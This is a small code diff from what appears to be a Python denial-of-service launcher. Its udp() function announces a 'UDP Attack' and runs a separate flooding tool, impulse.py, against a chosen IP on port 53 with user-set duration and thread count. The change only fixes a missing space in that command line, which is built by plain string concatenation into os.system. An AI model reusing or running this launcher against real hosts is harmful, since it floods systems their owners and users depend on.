@@ -27,7 +27,7 @@ if cont == 'N':
 def udp():
     print(Fore.LIGHTYELLOW_EX+"  Starting UDP Attack!")
     time.sleep(2)
-    os.system("python3 impulse.py --target "+ip+":53"+"  --time "+attacktime+"--threads "+threadcount+" --method UDP")
+    os.system("python3 impulse.py --target "+ip+":53"+"  --time "+attacktime+" --threads "+threadcount+" --method UDP")
     try:
         """Okehhh"""
     except KeyboardInterrupt:
